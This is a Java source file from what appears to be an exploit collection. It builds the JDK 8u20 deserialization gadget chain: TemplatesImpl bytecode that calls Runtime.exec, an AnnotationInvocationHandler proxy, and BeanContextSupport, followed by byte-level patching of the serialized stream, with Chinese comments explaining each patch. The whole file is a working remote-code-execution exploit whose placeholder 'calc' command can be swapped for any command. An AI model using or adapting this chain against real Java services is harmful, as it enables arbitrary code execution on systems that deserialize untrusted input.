package org.payload.yuansheng.jdk8u20;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javax.xml.transform.Templates;
import java.beans.beancontext.BeanContextSupport;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.LinkedHashSet;
import java.util.Map;

import static org.Tools.setClassPool.evilClass2;
import static org.Tools.setTemplatesImpl.template;


public class JDK8u20 {
    public static byte[] deleteAt(byte[] bs, int index) {
        int length = bs.length - 1;
        byte[] ret = new byte[length];

        if(index == bs.length - 1) {
            System.arraycopy(bs, 0, ret, 0, length);
        } else if(index < bs.length - 1) {
            for(int i = index; i < length; i++) {
                bs[i] = bs[i + 1];
            }

            System.arraycopy(bs, 0, ret, 0, length);
        }

        return ret;
    }

    public static byte[] addAtIndex(byte[] bs, int index, byte b) {
        int length = bs.length + 1;
        byte[] ret = new byte[length];

        System.arraycopy(bs, 0, ret, 0, index);
        ret[index] = b;
        System.arraycopy(bs, index, ret, index + 1, length - index - 1);

        return ret;
    }

    public static byte[] addAtLast(byte[] bs, byte b) {
        int length = bs.length + 1;
        byte[] ret = new byte[length];

        System.arraycopy(bs, 0, ret, 0, length-1);
        ret[length - 1] = b;

        return ret;
    }
    public static byte[] Payload() throws Exception{
        //final Object templates2 = Gadgets.createTemplatesImpl("calc");
        byte[] evilbyte = evilClass2("java.lang.Runtime.getRuntime().exec(\"calc\");");
        TemplatesImpl templates = template(evilbyte);
        String zeroHashCodeStr = "f5a5a608";

        HashMap map = new HashMap();
        map.put(zeroHashCodeStr, "any");
        Constructor handlerConstructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").
                getDeclaredConstructor(Class.class, Map.class);
        handlerConstructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) handlerConstructor.newInstance(Templates.class, map);

//        InvocationHandler handler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
//        Reflections.setFieldValue(handler, "type", Templates.class);

//        Templates proxy1 = Gadgets.createProxy(handler, Templates.class);

        Templates proxy = (Templates) Proxy.newProxyInstance(
                JDK8u20.class.getClassLoader(),
                new Class[]{Templates.class},
                handler);

//        Reflections.setFieldValue(templates, "_auxClasses", null);
//        Reflections.setFieldValue(templates, "_class", null);

        map.put(zeroHashCodeStr, templates); // swap in real object


        LinkedHashSet set = new LinkedHashSet();
        //HashSet set = new HashSet();

        BeanContextSupport bcs = new BeanContextSupport();
        Class cc = Class.forName("java.beans.beancontext.BeanContextSupport");
        Field serializable = cc.getDeclaredField("serializable");
        serializable.setAccessible(true);
        serializable.set(bcs, 0);

        Field beanContextChildPeer = cc.getSuperclass().getDeclaredField("beanContextChildPeer");
        beanContextChildPeer.set(bcs, bcs);

        set.add(bcs);

        //序列化
        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baous);

        oos.writeObject(set);
        oos.writeObject(handler);
        oos.writeObject(templates);
        oos.writeObject(proxy);
        oos.close();

        return baous.toByteArray();
    }

    public static byte[] fixStream(byte[] bytes) throws Exception {
        System.out.println("[+] Modify HashSet size from  1 to 3");
        bytes[89] = 3; //修改hashset的长度（元素个数）

        //调整 TC_ENDBLOCKDATA 标记的位置
        //0x73 = 115, 0x78 = 120
        //0x73 for TC_OBJECT, 0x78 for TC_ENDBLOCKDATA
        for (int i = 0; i < bytes.length; i++) {
            if (bytes[i] == 0 && bytes[i + 1] == 0 && bytes[i + 2] == 0 & bytes[i + 3] == 0 &&
                    bytes[i + 4] == 120 && bytes[i + 5] == 120 && bytes[i + 6] == 115) {
                System.out.println("[+] Delete TC_ENDBLOCKDATA at the end of HashSet");
                bytes = deleteAt(bytes, i + 5);
                break;
            }
        }


        //将 serializable 的值修改为 1
        //0x73 = 115, 0x78 = 120
        //0x73 for TC_OBJECT, 0x78 for TC_ENDBLOCKDATA
        for (int i = 0; i < bytes.length; i++) {
            if (bytes[i] == 120 && bytes[i + 1] == 0 && bytes[i + 2] == 1 && bytes[i + 3] == 0 &&
                    bytes[i + 4] == 0 && bytes[i + 5] == 0 && bytes[i + 6] == 0 && bytes[i + 7] == 115) {
                System.out.println("[+] Modify BeanContextSupport.serializable from 0 to 1");
                bytes[i + 6] = 1;
                break;
            }
        }

        /**
         TC_BLOCKDATA - 0x77
         Length - 4 - 0x04
         Contents - 0x00000000
         TC_ENDBLOCKDATA - 0x78
         **/

        //把这部分内容先删除，再附加到 AnnotationInvocationHandler 之后
        //目的是让 AnnotationInvocationHandler 变成 BeanContextSupport 的数据流
        //0x77 = 119, 0x78 = 120
        //0x77 for TC_BLOCKDATA, 0x78 for TC_ENDBLOCKDATA
        for (int i = 0; i < bytes.length; i++) {
            if (bytes[i] == 119 && bytes[i + 1] == 4 && bytes[i + 2] == 0 && bytes[i + 3] == 0 &&
                    bytes[i + 4] == 0 && bytes[i + 5] == 0 && bytes[i + 6] == 120) {
                System.out.println("[+] Delete TC_BLOCKDATA...int...TC_BLOCKDATA at the End of BeanContextSupport");
                bytes = deleteAt(bytes, i);
                bytes = deleteAt(bytes, i);
                bytes = deleteAt(bytes, i);
                bytes = deleteAt(bytes, i);
                bytes = deleteAt(bytes, i);
                bytes = deleteAt(bytes, i);
                bytes = deleteAt(bytes, i);
                break;
            }
        }

        /*
              serialVersionUID - 0x00 00 00 00 00 00 00 00
                  newHandle 0x00 7e 00 28
                  classDescFlags - 0x00 -
                  fieldCount - 0 - 0x00 00
                  classAnnotations
                    TC_ENDBLOCKDATA - 0x78
                  superClassDesc
                    TC_NULL - 0x70
              newHandle 0x00 7e 00 29
         */
        //0x78 = 120, 0x70 = 112
        //0x78 for TC_ENDBLOCKDATA, 0x70 for TC_NULL
        for (int i = 0; i < bytes.length; i++) {
            if (bytes[i] == 0 && bytes[i + 1] == 0 && bytes[i + 2] == 0 && bytes[i + 3] == 0 &&
                    bytes[i + 4] == 0 && bytes[i + 5] == 0 && bytes[i + 6] == 0 && bytes[i + 7] == 0 &&
                    bytes[i + 8] == 0 && bytes[i + 9] == 0 && bytes[i + 10] == 0 && bytes[i + 11] == 120 &&
                    bytes[i + 12] == 112) {
                System.out.println("[+] Add back previous delte TC_BLOCKDATA...int...TC_BLOCKDATA after invocationHandler");
                i = i + 13;
                bytes = addAtIndex(bytes, i++, (byte) 0x77);
                bytes = addAtIndex(bytes, i++, (byte) 0x04);
                bytes = addAtIndex(bytes, i++, (byte) 0x00);
                bytes = addAtIndex(bytes, i++, (byte) 0x00);
                bytes = addAtIndex(bytes, i++, (byte) 0x00);
                bytes = addAtIndex(bytes, i++, (byte) 0x00);
                bytes = addAtIndex(bytes, i++, (byte) 0x78);
                break;
            }
        }

        //将 sun.reflect.annotation.AnnotationInvocationHandler 的 classDescFlags 由 SC_SERIALIZABLE 修改为 SC_SERIALIZABLE | SC_WRITE_METHOD
        //这一步其实不是通过理论推算出来的，是通过debug 以及查看 pwntester的 poc 发现需要这么改
        //原因是如果不设置 SC_WRITE_METHOD 标志的话 defaultDataEnd = true，导致 BeanContextSupport -> deserialize(ois, bcmListeners = new ArrayList(1))
        // -> count = ois.readInt(); 报错，无法完成整个反序列化流程
        // 没有 SC_WRITE_METHOD 标记，认为这个反序列流到此就结束了
        // 标记： 7375 6e2e 7265 666c 6563 --> sun.reflect...
        for (int i = 0; i < bytes.length; i++) {
            if (bytes[i] == 115 && bytes[i + 1] == 117 && bytes[i + 2] == 110 && bytes[i + 3] == 46 &&
                    bytes[i + 4] == 114 && bytes[i + 5] == 101 && bytes[i + 6] == 102 && bytes[i + 7] == 108) {
                System.out.println("[+] Modify sun.reflect.annotation.AnnotationInvocationHandler -> classDescFlags from SC_SERIALIZABLE to " +
                        "SC_SERIALIZABLE | SC_WRITE_METHOD");
                i = i + 58;
                bytes[i] = 3;
                break;
            }
        }

        //加回之前删除的 TC_BLOCKDATA，表明 HashSet 到此结束
        System.out.println("[+] Add TC_BLOCKDATA at end");
        bytes = addAtLast(bytes, (byte) 0x78);

        return bytes;
    }
    public static void main(String[] args) throws Exception {
        byte[] bytes = Payload();
        byte[] barr = fixStream(bytes);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr));
        ois.readObject();
        ois.close();
    }
}
